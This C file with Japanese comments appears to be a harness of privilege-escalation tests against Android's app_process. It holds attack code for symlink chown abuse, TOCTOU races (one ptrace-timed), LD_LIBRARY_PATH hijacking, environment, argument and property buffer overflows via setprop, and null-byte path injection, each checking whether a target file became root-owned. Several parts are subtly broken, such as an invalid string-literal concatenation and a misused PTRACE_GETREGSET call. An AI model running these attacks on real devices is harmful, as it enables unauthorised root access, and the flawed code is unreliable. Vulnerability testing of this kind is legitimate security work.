#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <time.h>
#include "tests.h"

// ========== 既存テスト (1-5) は前回と同様 (軽微な修正) ==========
void test_symlink_chown(const char *app_path) {
    printf("\n[TEST-1] シンボリックリンク chown 攻撃\n");
    setup_test_environment();

    uid_t uid_before, gid_before;
    if (check_file_owner(TARGET_FILE, &uid_before, &gid_before) == 0) {
        printf("  変更前: %s (uid=%d, gid=%d)\n", TARGET_FILE, uid_before, gid_before);
    }

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };

    int ret = run_app_process(app_path, argv, envp);
    printf("  app_process 終了コード: %d\n", ret);

    uid_t uid_after, gid_after;
    if (check_file_owner(TARGET_FILE, &uid_after, &gid_after) == 0) {
        printf("  変更後: %s (uid=%d, gid=%d)\n", TARGET_FILE, uid_after, gid_after);
        if (uid_after == 0 && gid_after == 0) {
            printf("  [!] 脆弱性確認: %s が root に変更されました！\n", TARGET_FILE);
        } else {
            printf("  [-] 権限変更なし (パッチ適用済み)\n");
        }
    }
    cleanup_test_environment();
}

void test_env_overflow(const char *app_path) {
    printf("\n[TEST-2] 環境変数長過剰攻撃 (16KB)\n");
    setup_test_environment();

    char long_data[16384];
    memset(long_data, 'A', sizeof(long_data)-1);
    long_data[sizeof(long_data)-1] = '\0';
    char env_value[32768];
    snprintf(env_value, sizeof(env_value), "ANDROID_DATA=%s", long_data);

    char *envp[] = { env_value, NULL };
    char *argv[] = { (char*)app_path, "--help", NULL };

    printf("  環境変数サイズ: %zu バイト\n", strlen(env_value));
    int ret = run_app_process(app_path, argv, envp);
    if (ret == -1 || ret == 0) {
        printf("  プロセスが異常終了または強制終了 (カナリア検出の可能性)\n");
    } else {
        printf("  プロセス終了コード: %d (想定外の動作)\n", ret);
    }
    cleanup_test_environment();
}

void test_argv_overflow(const char *app_path) {
    printf("\n[TEST-3] 引数ベクター過剰攻撃 (1000個の引数)\n");
    setup_test_environment();

    const int ARG_COUNT = 1000;
    char **argv = malloc((ARG_COUNT + 2) * sizeof(char*));
    if (!argv) { perror("malloc"); return; }
    argv[0] = (char*)app_path;
    for (int i = 1; i <= ARG_COUNT; i++) {
        argv[i] = "-classpath";
    }
    argv[ARG_COUNT + 1] = NULL;

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (メモリ枯渇や二重解放の有無を確認)\n", ret);
    free(argv);
    cleanup_test_environment();
}

void test_dl_hijack(const char *app_path) {
    printf("\n[TEST-4] 動的リンカハイジャック (LD_LIBRARY_PATH)\n");
    setup_test_environment();

    char *envp[] = {
        "LD_LIBRARY_PATH=/data/local/tmp",
        "ANDROID_DATA=" TEST_DIR,
        NULL
    };
    char *argv[] = { (char*)app_path, "--zygote", NULL };

    printf("  LD_LIBRARY_PATH を /data/local/tmp に設定\n");
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (setuid バイナリでは通常無視されます)\n", ret);
    cleanup_test_environment();
}

void test_toctou_race(const char *app_path) {
    printf("\n[TEST-5] TOCTOU 競合 (usleep版)\n");
    setup_test_environment();

    char real_cache[PATH_MAX];
    snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
    mkdir(real_cache, 0755);
    unlink(CACHE_DIR);
    symlink(real_cache, CACHE_DIR);

    pid_t pid = fork();
    if (pid == 0) {
        char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
        char *argv[] = { (char*)app_path, "--zygote", NULL };
        execve(app_path, argv, envp);
        perror("execve child");
        exit(1);
    } else if (pid > 0) {
        usleep(50000);
        unlink(CACHE_DIR);
        symlink(TARGET_FILE, CACHE_DIR);
        printf("  シンボリックリンクを %s に差し替えました\n", TARGET_FILE);

        int status;
        waitpid(pid, &status, 0);
        printf("  app_process 終了コード: %d\n", WEXITSTATUS(status));

        uid_t uid_after;
        if (check_file_owner(TARGET_FILE, &uid_after, NULL) == 0 && uid_after == 0) {
            printf("  [!] TOCTOU 成功: %s が root になりました！\n", TARGET_FILE);
        } else {
            printf("  [-] TOCTOU 失敗\n");
        }
    } else {
        perror("fork");
    }
    cleanup_test_environment();
}

// ========== 拡張テスト (6-9) ==========

/* テスト6: chmod で setuid ビットを維持できるか */
void test_chmod_setuid(const char *app_path) {
    printf("\n[TEST-6] chmod による Setuid ビット維持攻撃\n");
    setup_test_environment();

    // ターゲットファイルに setuid ビットを事前付与
    if (chmod(TARGET_FILE, 04777) != 0) {
        perror("chmod pre-set");
        cleanup_test_environment();
        return;
    }
    mode_t mode_before;
    if (check_file_mode(TARGET_FILE, &mode_before) == 0) {
        printf("  変更前モード: 0%o\n", mode_before & 07777);
    }

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };
    int ret = run_app_process(app_path, argv, envp);
    printf("  app_process 終了コード: %d\n", ret);

    mode_t mode_after;
    if (check_file_mode(TARGET_FILE, &mode_after) == 0) {
        printf("  変更後モード: 0%o\n", mode_after & 07777);
        if ((mode_after & S_ISUID) && (mode_after & S_IXUSR)) {
            printf("  [!] setuid ビットが維持されました！このバイナリは root 実行可能です。\n");
        } else {
            printf("  [-] setuid ビットが失われました (パッチ適用済み)\n");
        }
    }
    cleanup_test_environment();
}

/* テスト7: ptrace を利用した確実な TOCTOU */
static int wait_for_syscall(pid_t pid) {
    int status;
    while (1) {
        ptrace(PTRACE_SYSCALL, pid, 0, 0);
        waitpid(pid, &status, 0);
        if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) {
            return 1;
        }
        if (WIFEXITED(status)) return 0;
    }
}

void test_ptrace_toctou(const char *app_path) {
    printf("\n[TEST-7] ptrace 利用確実 TOCTOU\n");
    setup_test_environment();

    // 事前に実ディレクトリを作成 (mkdir 成功させる)
    char real_cache[PATH_MAX];
    snprintf(real_cache, sizeof(real_cache), "%s/real_cache", TEST_DIR);
    mkdir(real_cache, 0755);
    unlink(CACHE_DIR);
    symlink(real_cache, CACHE_DIR);

    pid_t pid = fork();
    if (pid == 0) {
        // 子: トレース対象
        ptrace(PTRACE_TRACEME, 0, 0, 0);
        char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
        char *argv[] = { (char*)app_path, "--zygote", NULL };
        execve(app_path, argv, envp);
        perror("execve child");
        exit(1);
    } else if (pid > 0) {
        // 親: トレーサー
        int status;
        waitpid(pid, &status, 0);
        ptrace(PTRACE_SETOPTIONS, pid, 0, PTRACE_O_TRACESYSGOOD);

        int in_syscall = 0;
        while (1) {
            if (!wait_for_syscall(pid)) break;

            struct user_pt_regs regs;
            ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &regs);

            // aarch64 syscall number: x8, mkdir = 83
            if (regs.regs[8] == 83) {
                if (!in_syscall) {
                    // エントリ
                    in_syscall = 1;
                } else {
                    // リターン: この瞬間に symlink を差し替える
                    unlink(CACHE_DIR);
                    symlink(TARGET_FILE, CACHE_DIR);
                    printf("  [ptrace] mkdir リターン直後に symlink を差し替えました\n");
                    in_syscall = 0;
                }
            } else {
                if (in_syscall) in_syscall = 0;
            }
        }

        int wstatus;
        waitpid(pid, &wstatus, 0);
        printf("  app_process 終了コード: %d\n", WEXITSTATUS(wstatus));

        uid_t uid_after;
        if (check_file_owner(TARGET_FILE, &uid_after, NULL) == 0 && uid_after == 0) {
            printf("  [!] ptrace TOCTOU 成功: %s が root になりました！\n", TARGET_FILE);
        } else {
            printf("  [-] ptrace TOCTOU 失敗 (カーネルが保護している可能性)\n");
        }
    } else {
        perror("fork");
    }
    cleanup_test_environment();
}

/* テスト8: property_get バッファオーバーフロー (要 root で事前設定) */
void test_property_overflow(const char *app_path) {
    printf("\n[TEST-8] property_get バッファオーバーフロー\n");
    setup_test_environment();

    // 長大なプロパティ値を設定 (root 権限が必要なため、失敗しても無視)
    char long_prop[8192];
    memset(long_prop, 'B', sizeof(long_prop)-1);
    long_prop[sizeof(long_prop)-1] = '\0';
    char set_cmd[10240];
    snprintf(set_cmd, sizeof(set_cmd), "setprop ro.product.cpu.abilist64 \"%s\"", long_prop);
    system(set_cmd);

    char *envp[] = { "ANDROID_DATA=" TEST_DIR, NULL };
    char *argv[] = { (char*)app_path, "--abi-list=" long_prop, NULL };
    printf("  ro.product.cpu.abilist64 を %zu バイトに設定しました。\n", strlen(long_prop));
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (オーバーフローが発生した場合はクラッシュ)\n", ret);
    cleanup_test_environment();
}

/* テスト9: ヌルバイトインジェクションによるパストラバーサル */
void test_null_byte_injection(const char *app_path) {
    printf("\n[TEST-9] ヌルバイトインジェクション\n");
    setup_test_environment();

    // ANDROID_DATA にヌルバイトを含める
    // 例: /data/local/tmp\x00/target -> snprintf で /data/local/tmp として解釈される
    char env_value[256];
    snprintf(env_value, sizeof(env_value), "ANDROID_DATA=" TEST_DIR "\x00/target");
    char *envp[] = { env_value, NULL };
    char *argv[] = { (char*)app_path, "--zygote", NULL };

    printf("  ANDROID_DATA にヌルバイトを埋め込み: %s\n", env_value);
    int ret = run_app_process(app_path, argv, envp);
    printf("  終了コード: %d (パスが途中で切られれば mkdir は別の場所で実行される)\n", ret);

    // 想定: ヌルバイト以降は無視され、TEST_DIR で mkdir/chown が実行される。
    // chown が /data/local/tmp の別のファイルに影響するか確認するため、所有者をチェック
    uid_t uid_after;
    if (check_file_owner(TARGET_FILE, &uid_after, NULL) == 0) {
        printf("  TARGET_FILE の現在の所有者: uid=%d\n", uid_after);
    }
    cleanup_test_environment();
}
